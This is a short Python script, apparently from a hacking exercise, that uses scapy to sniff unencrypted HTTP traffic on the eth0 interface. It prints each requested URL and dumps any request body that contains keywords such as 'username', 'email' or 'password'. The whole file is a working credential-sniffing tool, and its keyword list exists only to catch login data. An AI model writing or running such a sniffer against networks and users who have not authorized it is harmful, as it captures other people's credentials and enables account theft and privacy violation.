import scapy.all as scapy
from scapy.layers import http
from colorama import Fore,Back,Style

def sniff(interface):
	scapy.sniff(iface=interface ,store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		
		url = packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
		print(Fore.GREEN+"[*] " + url) 
		# print(packet.show())

		if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			keywords = ["username","uname","email","pass","password"]
			for keyword in keywords:
				if keyword in load:
					print(Fore.RED+"\n\n[+] "+load+Style.RESET_ALL+"\n\nExiting program!!")
					exit(0)
sniff("eth0")